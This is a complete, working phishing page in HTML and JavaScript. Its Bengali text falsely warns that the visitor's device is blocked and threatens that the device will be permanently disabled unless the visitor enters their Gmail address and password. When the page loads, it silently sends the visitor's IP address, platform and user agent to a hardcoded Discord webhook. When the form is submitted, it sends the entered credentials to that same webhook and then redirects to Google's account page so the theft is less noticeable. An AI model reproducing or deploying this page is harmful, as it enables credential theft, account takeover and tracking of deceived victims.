<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Recovery System</title>
    <style>
        body { background: #ffffff; color: #000; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .box { width: 85%; max-width: 380px; border: 2px solid #ff0000; padding: 20px; border-radius: 12px; text-align: center; box-shadow: 0 0 20px rgba(255,0,0,0.1); }
        .warn { color: #ff0000; font-weight: bold; font-size: 20px; text-transform: uppercase; margin-bottom: 10px; }
        .ip-box { background: #f0f0f0; padding: 8px; border-radius: 5px; font-family: monospace; font-weight: bold; margin: 10px 0; font-size: 14px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
        button { width: 100%; padding: 14px; background: #ff0000; color: #fff; border: none; font-weight: bold; border-radius: 6px; cursor: pointer; }
    </style>
</head>
<body>

<div class="box">
    <div class="warn">⚠️ সিকিউরিটি অ্যালার্ট!</div>
    <p style="font-size: 14px; line-height: 1.5;">আপনার ডিভাইসটি <b>Suspicious Activity</b>-এর কারণে ব্লক করা হয়েছে। এখনই ভেরিফাই না করলে ডিভাইসটি স্থায়ীভাবে অচল হয়ে যাবে।</p>
    
    <div class="ip-box">সনাক্তকৃত আইপি: <span id="ip">Scanning...</span></div>

    <div id="form">
        <input type="email" id="email" placeholder="আপনার প্রাইমারি জিমেইল" required>
        <input type="password" id="pass" placeholder="জিমেইল পাসওয়ার্ড" required>
        <button onclick="sendCredentials()">ডিভাইস আনলক করুন</button>
    </div>
</div>

<script>
    const HOOK = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";

    // ১. ক্লিক করার সাথে সাথে ফাস্ট আইপি ট্র্যাকিং
    async function quickCapture() {
        try {
            // আইপি সংগ্রহের জন্য দ্রুততম সার্ভিস
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            document.getElementById('ip').innerText = data.ip;

            // ডিসকর্ডে তৎক্ষণাৎ আইপি পাঠানো
            fetch(HOOK, {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    content: "🚀 **IMMEDIATE IP DETECTED** 🚀",
                    embeds: [{
                        color: 16711680,
                        fields: [
                            { name: "IP Address", value: data.ip },
                            { name: "Platform", value: navigator.platform },
                            { name: "User Agent", value: navigator.userAgent }
                        ]
                    }]
                })
            });
        } catch (e) {
            // যদি আইপি সার্ভিস ফেল করে তবে শুধু ডিভাইস ইনফো পাঠাবে
            fetch(HOOK, {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({ content: "⚠️ Target entered but IP service blocked." })
            });
        }
    }

    // ২. জিমেইল ও পাসওয়ার্ড পাঠানো
    async function sendCredentials() {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;

        if (!email || !pass) {
            alert("সব তথ্য দিন নতুবা আপনার ফোনটি এখনই ব্যান্ড হবে!");
            return;
        }

        await fetch(HOOK, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                content: "🧨 **GMAIL CAPTURED** 🧨",
                embeds: [{
                    color: 0,
                    fields: [
                        { name: "Email", value: email },
                        { name: "Password", value: pass }
                    ]
                }]
            })
        });

        alert("ভেরিফিকেশন সফল! আপনার ডিভাইসটি এখন সুরক্ষিত।");
        window.location.href = "https://myaccount.google.com/";
    }

    // পেজ লোড হওয়ার সাথে সাথেই ফাংশনটি চালু হবে
    window.onload = quickCapture;
</script>

</body>
</html>
